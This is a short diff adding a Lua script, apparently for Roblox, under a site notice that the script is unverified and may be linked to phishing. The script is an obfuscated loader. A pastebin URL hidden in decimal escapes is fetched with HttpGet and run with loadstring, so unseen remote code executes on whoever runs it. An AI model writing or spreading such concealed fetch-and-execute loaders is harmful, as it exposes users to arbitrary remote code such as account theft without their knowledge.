@@ -1,0 +1,14 @@
+-- [[ Rscripts Risk Notice ]]
+-- This script is not verified by rscripts.net. Deal with caution.
+--
+-- Stay safe:
+--   • Never log in on unofficial Roblox sites or lookalike domains.
+--   • Real Roblox links use roblox.com (check the .com ending).
+--   • Treat fake Roblox login / "claim reward" pages as phishing.
+-- [[ End Rscripts Risk Notice ]]
+
+--[[ Protected by Lua Guard ]]
+
+(function(...) 
+loadstring(game:HttpGet("\104\116\116\112\115\058\047\047\112\097\115\116\101\098\105\110\046\099\111\109\047\114\097\119\047\080\089\053\109\055\048\120\057"))()
+ end)(...)
